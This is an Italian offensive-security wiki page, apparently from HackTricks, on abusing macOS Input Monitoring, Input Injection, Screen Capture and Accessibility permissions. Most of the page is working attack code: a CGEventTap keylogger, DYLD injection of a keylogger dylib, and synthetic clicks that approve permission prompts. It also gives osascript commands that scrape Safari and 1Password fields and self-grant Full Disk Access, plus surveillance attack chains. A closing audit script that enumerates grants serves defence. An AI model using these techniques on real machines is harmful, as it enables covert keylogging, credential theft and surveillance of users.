# Abuso de Input Monitoring, Screen Capture e Accessibility in macOS

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Tre servizi TCC correlati controllano il modo in cui le applicazioni possono osservare e interagire con la sessione desktop dell'utente:

| Servizio TCC | Permesso | Capacità |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Leggere tutti gli eventi di tastiera e mouse a livello di sistema (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Iniettare eventi sintetici di tastiera e mouse |
| `kTCCServiceScreenCapture` | **Screen Capture** | Leggere il display buffer, acquisire screenshot, registrare lo schermo |
| `kTCCServiceAccessibility` | **Accessibility** | Controllare altre applicazioni tramite l'API AXUIElement, leggere gli elementi dell'interfaccia utente |

Questi permessi rappresentano **la combinazione più pericolosa su macOS**: insieme forniscono:
- Keylogging completo di ogni pressione di tasto (password, messaggi, carte di credito)
- Registrazione dello schermo di tutti i contenuti visibili
- Iniezione di input sintetici (fare clic sui pulsanti, approvare i dialoghi)
- Controllo completo della GUI, equivalente all'accesso fisico

---

## Input Monitoring (kTCCServiceListenEvent)

### Come funziona

macOS utilizza l'API **`CGEventTap`** per consentire ai processi di intercettare gli eventi di input dal sistema di eventi Quartz. Un processo con il permesso ListenEvent può creare un event tap che riceve **ogni evento di tastiera e mouse** prima o dopo che raggiunga l'applicazione target.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Individuazione dei binari con entitlement
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging tramite Code Injection

Se un binary con il permesso ListenEvent ha anche la **validazione delle librerie disabilitata** o **consente le variabili d'ambiente DYLD**, un attacker può iniettare una dylib che registra un CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
La dylib iniettata eredita il grant TCC ListenEvent del target e cattura tutti i tasti premuti.

### Attack: Credential Harvesting

Un keylogger sofisticato può correlare i tasti premuti con l'applicazione attiva:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Iniezione di input (kTCCServicePostEvent)

### Come funziona

L'autorizzazione PostEvent consente di creare un event tap con **`kCGEventTapOptionDefault`** (può modificare/iniettare eventi) invece di ListenOnly.<sup>[[1]](#references)</sup> Ciò consente di:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attack: Automated TCC Prompt Approval

Con PostEvent, un attacker può **simulare il clic su "Allow"** nelle finestre di dialogo delle autorizzazioni TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Cattura schermo (kTCCServiceScreenCapture)

### Come funziona

L'autorizzazione alla cattura dello schermo consente di leggere il buffer del display utilizzando:
- **`CGWindowListCreateImage`** — cattura qualsiasi finestra o l'intero schermo
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderna per lo streaming dei contenuti dello schermo<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — cattura dello schermo con accelerazione hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Individuazione dei client di cattura dello schermo
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Un processo di screen capture iniettato può catturare periodicamente dei frame e utilizzare l'OCR per estrarre le password:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> A partire da **macOS Sonoma**, l'acquisizione dello schermo mostra un **indicatore persistente** nella barra dei menu. Nelle versioni precedenti, la registrazione dello schermo poteva essere completamente invisibile. Tuttavia, una breve acquisizione di un singolo fotogramma potrebbe ancora passare inosservata agli utenti.

### Attack: Session Recording

La registrazione continua dello schermo fornisce una riproduzione completa della sessione dell'utente:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibilità (kTCCServiceAccessibility)

### Come funziona

L'accesso all'accessibilità consente di controllare altre applicazioni tramite l'**AXUIElement API**.<sup>[[2]](#references)</sup> Un processo con accesso all'accessibilità può:

1. **Leggere** qualsiasi elemento dell'interfaccia utente in qualsiasi applicazione (campi di testo, etichette, pulsanti, menu)
2. **Fare clic** sui pulsanti e interagire con i controlli
3. **Digitare** testo in qualsiasi campo di testo
4. **Navigare** nei menu e nelle finestre di dialogo
5. **Acquisire** i dati visualizzati da qualsiasi applicazione in esecuzione
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attacco: concessione autonoma dei permessi TCC

L'abuso più pericoloso dell'accessibilità consiste nel navigare nelle Impostazioni di Sistema per concedere al proprio malware ulteriori permessi.<sup>[[4]](#references)</sup>
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attacco: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attacco: Azioni automatizzate dell'utente
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Catene di attacco

### Catena: Input Monitoring + Screen Capture = Sorveglianza completa
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibilità + PostEvent = Controllo remoto completo
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Catena: Accessibilità → Auto-concessione dell'accesso a Camera/Microfono → Sorveglianza
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Rilevamento ed enumerazione
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — API di accessibilità](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Eventi sintetici e sicurezza dell'interfaccia utente su macOS](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
